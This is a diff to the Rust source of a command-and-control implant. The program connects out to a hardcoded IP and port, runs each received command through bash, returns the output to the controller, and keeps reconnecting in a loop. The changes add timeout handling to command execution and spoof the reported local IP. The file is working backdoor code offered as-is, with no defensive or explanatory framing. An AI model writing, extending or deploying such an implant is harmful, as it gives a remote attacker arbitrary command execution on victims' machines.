@@ -1,14 +1,16 @@
 use std::net::TcpStream;
 // use std::net::Shutdown;
 use std::io::Write;
-use std::io::Read;
-use std::process::Command;
 use local_ip_address::local_ip;
 use std::{thread, time};
 use std::path::Path;
 use std::env::set_current_dir;
 // use std::process::Output;
 use subprocess::Exec;
+use std::process::{Command, Stdio};
+use wait_timeout::ChildExt;
+use std::time::Duration;
+use std::io::Read;
 
 //TODO 
 //Implement multiple IP addresses and ports (eventually connect to the router)
@@ -41,12 +43,38 @@ fn connect(ip: &str) -> TcpStream {
 }
 
 fn run_command(cmd: &str) -> String {
-    let cmd_out = {Exec::shell(cmd)}.capture().unwrap().stdout_str();
-    // let cmd_out = if cfg!(windows) { //if it's windows, use cmd /c
-    //     Command::new("CMD").arg("/C").arg(cmd).output().unwrap()
-    // } else { //if it's not windows, use sh -c
-    //     Command::new("sh").arg("-c").arg(cmd).output().unwrap()
-    // };
+    let mut child = match Command::new("/bin/bash").arg("-c").arg(cmd).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn(){
+        Ok(out)=>{
+            out
+        }
+        Err(e)=>{
+            return format!("");
+        }
+    };
+
+    let one_sec = Duration::from_secs(3);
+    let status_code = match child.wait_timeout(one_sec).unwrap() {
+        Some(status) => status.code(),
+        None => {
+            match child.kill(){
+                Ok(_)=>{
+                    "Process killed."
+                }
+                Err(_)=>{
+                    "Process could not be killed."
+                }
+            };
+            child.wait().unwrap().code()
+        }
+    };
+
+    let mut stdout_str = String::new();
+    let mut stdout = child.stdout.unwrap();
+    let mut stderr_str = String::new();
+    let mut stderr = child.stderr.unwrap();
+    stdout.read_to_string(&mut stdout_str);
+    stderr.read_to_string(&mut stderr_str);
+    let cmd_out = format!("{}{}",stderr_str,stdout_str);
     return cmd_out;
 }
 
@@ -62,9 +90,10 @@ fn c2(ip:&str) {
         }
         let recv = std::str::from_utf8(&buffer).unwrap().trim_matches(char::from(0)); //string of recv
         if recv.contains("getIP") { //if it's getIP, return the IP
-            let local_ip = local_ip().unwrap(); //get the local IP
-            let local_ip = format!("{}\n",local_ip); //format IP into string
-            let local_ip = local_ip.as_bytes();
+            // let local_ip = local_ip().unwrap(); //get the local IP
+            // let local_ip = format!("{}\n",local_ip); //format IP into string
+            // let local_ip = local_ip.as_bytes();
+            let local_ip = "10.1.1.1".as_bytes();
             stream.write(&local_ip).unwrap(); //send it
             continue;
         }
@@ -124,8 +153,8 @@ fn constant_checker(){
 fn main(){
     let ip = "129.21.49.57:5678";
     loop{
-        c2(&ip);
         connect_to_router();
+        c2(&ip);
     }
     // constant_checker();
 }
